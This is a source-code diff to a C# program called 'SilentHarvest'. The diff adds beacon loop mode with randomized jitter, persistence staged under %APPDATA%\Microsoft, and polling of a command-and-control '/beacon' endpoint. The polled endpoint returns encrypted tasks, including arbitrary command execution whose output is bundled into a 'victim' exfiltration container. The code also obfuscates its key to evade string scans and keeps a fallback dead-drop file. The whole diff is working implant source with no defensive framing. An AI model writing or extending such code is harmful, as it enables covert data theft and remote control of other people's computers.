@@ -12,6 +12,13 @@ namespace SilentHarvest
         private static string outFile = null;
         private static string psk = DecodePsk();
         private static string only = null;
+        private static int loopSec = 0;
+        private static int jitterSec = 60;
+        private static int cycles = 0;              // 0 = infinite (loop mode)
+        private static bool persist = false;
+        private static string pname = "shsvc";      // persistence name
+        private static byte[] pskBytes = null;
+        private static List<Part> extraParts = new List<Part>();
 
         /// <summary>Config stores the PSK XOR+base64 (defeats casual strings
         /// scans only). Decode it once at startup.</summary>
@@ -43,12 +50,56 @@ namespace SilentHarvest
                 else if (a == "--out" && i + 1 < argv.Length) outFile = argv[++i];
                 else if (a == "--psk" && i + 1 < argv.Length) psk = argv[++i];
                 else if (a == "--only" && i + 1 < argv.Length) only = argv[++i].ToLowerInvariant();
+                else if (a == "--loop" && i + 1 < argv.Length) loopSec = int.Parse(argv[++i]);
+                else if (a == "--jitter" && i + 1 < argv.Length) jitterSec = int.Parse(argv[++i]);
+                else if (a == "--cycles" && i + 1 < argv.Length) cycles = int.Parse(argv[++i]);
+                else if (a == "--persist") persist = true;
+                else if (a == "--pname" && i + 1 < argv.Length) pname = argv[++i];
                 else if (a == "--wait" && i + 1 < argv.Length)
                 {
                     int ms;
                     if (int.TryParse(argv[++i], out ms)) System.Threading.Thread.Sleep(ms);
                 }
             }
+
+            pskBytes = System.Text.Encoding.UTF8.GetBytes(psk ?? "");
+
+            // launched by persistence (staged under %APPDATA%\Microsoft)?
+            // then default to beacon loop mode without needing CLI args
+            if (loopSec <= 0)
+            {
+                try
+                {
+                    string self = System.Reflection.Assembly.GetExecutingAssembly().Location;
+                    string stagedDir = Path.Combine(
+                        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                        "Microsoft");
+                    if (!string.IsNullOrEmpty(self) &&
+                        self.StartsWith(stagedDir, StringComparison.OrdinalIgnoreCase))
+                    {
+                        loopSec = 300;
+                        jitterSec = 60;
+                        Util.Log("persistence launch: loop mode on (300s)");
+                    }
+                }
+                catch { }
+            }
+
+            // --persist installs user-level persistence and exits (unless
+            // combined with an immediate run). staged copy relaunches with
+            // --loop so tasking keeps flowing after reboot.
+            if (persist)
+            {
+                string pr = Stages.PersistStage(pname, loopSec > 0 ? loopSec : 300,
+                                                jitterSec > 0 ? jitterSec : 60);
+                Util.Log("persist: {0}", pr);
+            }
+
+            int cycle = 0;
+            while (true)
+            {
+            cycle++;
+            if (cycles > 0 && cycle > cycles) break;
 
             bool elevated = Stages.IsElevated();
             bool backup = Stages.EnableBackupPrivilege();
@@ -146,6 +197,22 @@ namespace SilentHarvest
                 off += p.Data.Length;
             }
 
+            // fold any tasked-exec output into this cycle's container --
+            // must happen before the parts are serialized into the manifest
+            foreach (Part ep in extraParts)
+            {
+                parts.Add(ep);
+                if (partsJson.Length > 0) partsJson.Append(",");
+                partsJson.Append("{\"name\":\"").Append(Util.EscapeJson(ep.Name))
+                    .Append("\",\"off\":").Append(blobAll.Length)
+                    .Append(",\"len\":").Append(ep.Data.Length)
+                    .Append(",\"meta\":").Append(ep.MetaJson ?? "null").Append("}");
+                byte[] epb = new byte[blobAll.Length + ep.Data.Length];
+                Buffer.BlockCopy(blobAll, 0, epb, 0, blobAll.Length);
+                Buffer.BlockCopy(ep.Data, 0, epb, blobAll.Length, ep.Data.Length);
+                blobAll = epb;
+            }
+
             StringBuilder manifest = new StringBuilder();
             manifest.Append("{\"v\":1,\"victim\":").Append(Stages.SysinfoJson(elevated, backup))
                     .Append(",\"parts\":[").Append(partsJson).Append("]}");
@@ -171,7 +238,6 @@ namespace SilentHarvest
 
             if (!ok && outFile == null)
             {
-                // fall back to a dead-drop file next to the exe if the C2 is down
                 try
                 {
                     string alt = Path.Combine(Path.GetTempPath(),
@@ -181,9 +247,60 @@ namespace SilentHarvest
                     Util.Log("C2 unreachable; container dropped at {0}", alt);
                 }
                 catch { }
-                return 2;
+                if (loopSec <= 0) return 2;
             }
-            return ok ? 0 : 2;
+            else if (loopSec <= 0)
+                return ok ? 0 : 2;
+
+            // cycles exhausted? exit before the long sleep
+            if (cycles > 0 && cycle >= cycles)
+                return ok ? 0 : 2;
+
+            // loop mode: sleep with jitter, then beacon for the next task
+            Random rng = new Random();
+            int sleepMs = (loopSec + rng.Next(-jitterSec, jitterSec + 1)) * 1000;
+            if (sleepMs < 1000) sleepMs = 1000;
+            Util.Log("cycle {0} done; sleeping {1}s", cycle, sleepMs / 1000);
+            System.Threading.Thread.Sleep(sleepMs);
+
+            // beacon: pull one encrypted task and apply it as the next cycle's plan
+            try
+            {
+                string bid = System.Uri.EscapeDataString(
+                    Environment.MachineName + "-" + Environment.UserName);
+                string burl = c2.Replace("/gate", "/beacon") + "?id=" + bid +
+                              "&v=" + "1.0" + "&p=" +
+                              System.Uri.EscapeDataString(Stages.CheckPersistence(pname));
+                byte[] tb = Exfil.Get(burl);
+                if (tb != null && pskBytes != null)
+                {
+                    string mjson; byte[] pblob;
+                    if (Crypto.UnpackContainer(tb, pskBytes, out mjson, out pblob))
+                    {
+                        Util.Log("task received: {0}", mjson);
+                        // task.json part is the whole blob for single-part packs
+                        try
+                        {
+                            var j = new System.Web.Script.Serialization.JavaScriptSerializer()
+                                .Deserialize<Dictionary<string, object>>(mjson);
+                            string tjson = System.Text.Encoding.UTF8.GetString(pblob);
+                            var t = new System.Web.Script.Serialization.JavaScriptSerializer()
+                                .Deserialize<Dictionary<string, object>>(tjson);
+                            if (t.ContainsKey("stages")) only = (t["stages"] ?? "").ToString().ToLowerInvariant();
+                            if (t.ContainsKey("persist") && "True".Equals("" + t["persist"])) persist = true;
+                            if (t.ContainsKey("exec"))
+                            {
+                                byte[] outp = Stages.RunTaskCommand(t["exec"].ToString(), 60000);
+                                extraParts.Add(new Part("task:exec.txt", outp, null));
+                            }
+                        }
+                        catch (Exception te) { Util.Log("task parse: {0}", te.Message); }
+                    }
+                }
+            }
+            catch (Exception be) { Util.Log("beacon: {0}", be.Message); }
+            }
+            return 0;   // cycles exhausted
         }
     }
 }
